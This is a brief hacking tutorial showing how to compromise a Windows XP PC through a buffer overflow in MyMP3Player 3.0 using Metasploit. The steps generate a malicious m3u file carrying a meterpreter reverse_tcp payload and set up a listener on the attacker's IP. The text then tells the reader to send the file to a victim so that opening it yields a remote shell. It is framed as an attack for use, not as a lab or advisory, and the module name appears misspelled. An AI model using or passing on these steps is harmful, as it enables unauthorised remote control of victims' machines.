How to Hack PC in LAN Network using MyMP3Player

This module exploits a stack buffer overflow in Steinberg MyMP3Player == 3.0. When the application is used to open a specially crafted m3u file, a buffer overflow occurs allowing arbitrary code execution.
MyMP3Player 3.0
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/mymp3palyer_m3u
Msf exploit (mymp3palyer_m3u)>set payload windows/meterpreter/reverse_tcp
Msf exploit (mymp3palyer_m3u)>set lhost 192.168.1.3 (IP of Local Host)
Msf exploit (mymp3palyer_m3u)>exploit

After we successfully generate the malicious MP3 File, it will stored on your local computer
/root/.msf4/local/msf.m3u

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.3
exploit 
Now send your msf.m3u files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
